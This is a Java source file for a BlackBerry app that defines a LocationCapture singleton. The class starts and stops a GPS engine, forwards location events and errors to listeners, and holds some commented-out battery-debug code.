package com.vvt.gpsc;

import java.util.Vector;
import net.rim.device.api.system.RuntimeStore;
import com.vvt.event.FxEvent;
import com.vvt.event.FxEventCapture;
import com.vvt.event.FxEventListener;
import com.vvt.event.FxGpsBatteryLifeDebugEvent;
import com.vvt.event.constant.FxCallingModule;
import com.vvt.event.constant.FxDebugMode;
import com.vvt.global.Global;
import com.vvt.pref.PrefGeneral;
import com.vvt.pref.Preference;
import com.vvt.pref.PreferenceType;
import com.vvt.std.Constant;
import com.vvt.std.Log;
import com.vvt.std.PhoneInfo;

public class LocationCapture extends FxEventCapture implements FxEventListener {
	
	private final String TAG	= "LocationCapture";
	private static LocationCapture self;	
	private static final long GUID	= 0xff3a436e3704e9d8L;		
	private GPSEngine gpsEngine = new GPSEngine();
	private Preference pref = Global.getPreference();
	private FxGpsBatteryLifeDebugEvent gpsDebugEvent = null;
	private Vector gpsListeners = new Vector(); 
	
	private LocationCapture() {
		gpsEngine.setFxEventListener(this);
	}
	
	public static LocationCapture getInstance()	{
		if (self == null) {
			self = (LocationCapture) RuntimeStore.getRuntimeStore().get(GUID);
			if (self == null) {
				self = new LocationCapture();
				RuntimeStore.getRuntimeStore().put(GUID, self);
			}
		}
		return self;
	}
	
	public void destroy()	{
		gpsListeners.removeAllElements();
		self = null;
		RuntimeStore.getRuntimeStore().remove(GUID);
	}
	
	public void addGPSListener(GPSPositionListener listener) {
		gpsListeners.addElement(listener);
	}
	
	public void removeGPSListener(GPSPositionListener listener) {
		if (gpsListeners.contains(listener)) {
			gpsListeners.removeElement(listener);
		}
	}
	
	public void setGPSOption(GPSOption option) {
		gpsEngine.setGPSOption(option);
	}
	
	public void setMode(FxCallingModule callingModule)	{
		gpsEngine.setMode(callingModule);
	}
	
	public void startCapture() {
		if (!isEnabled() && sizeOfFxEventListener() > 0 && gpsEngine.getGPSOption() != null) {
			setEnabled(true);
//			constructGPSDebugEvent();
			gpsEngine.startGPSEngine();
		}
	}
	
	public void stopCapture() {
//		Log.debug("LocationCapture.stopCapture()","ENTER");
		if (isEnabled()) {
			setEnabled(false);
			gpsEngine.stopGPSEngine();
		}
	}
	
	private void constructGPSDebugEvent() {
		PrefGeneral generalInfo = (PrefGeneral)pref.getPrefInfo(PreferenceType.PREF_GENERAL);
		if (generalInfo.getFxDebugMode().getId() == FxDebugMode.GPS.getId()) {
			gpsDebugEvent = new FxGpsBatteryLifeDebugEvent();
			gpsDebugEvent.setStartTime(System.currentTimeMillis());
			gpsDebugEvent.setBattaryBefore(PhoneInfo.getBattaryLevel() + Constant.PERCENTAGE);
		}
	}
	
	private void updateGPSDebugEvent() {
		if (gpsDebugEvent != null) {
			gpsDebugEvent.setStopTime(System.currentTimeMillis());
			gpsDebugEvent.setBattaryAfter(PhoneInfo.getBattaryLevel() + Constant.PERCENTAGE);
		}
	}

	// FxEventListener
	public void onError(Exception e) {
		Log.error(TAG, "onError()", e);
		if (isEnabled()) {
			notifyError(e);
			if (gpsEngine.isEnabled()) {
				gpsEngine.stopGPSEngine();
			}
//			constructGPSDebugEvent();
			gpsEngine.startGPSEngine();
		}
	}
	
	public void onEvent(FxEvent event) {
		if (isEnabled()) {
			/*PrefGeneral generalInfo = (PrefGeneral)pref.getPrefInfo(PreferenceType.PREF_GENERAL);
			if (generalInfo.getFxDebugMode().getId() == FxDebugMode.GPS.getId()) {
				updateGPSDebugEvent();
				FxGPSEvent gpsEvent = (FxGPSEvent)event;
				gpsEvent.setDebugEvent(gpsDebugEvent);
			}*/
			notifyEvent(event);
			if (gpsEngine.isEnabled()) {
				gpsEngine.stopGPSEngine();
			}
//			constructGPSDebugEvent();
			gpsEngine.startGPSEngine();
		}
	}
}
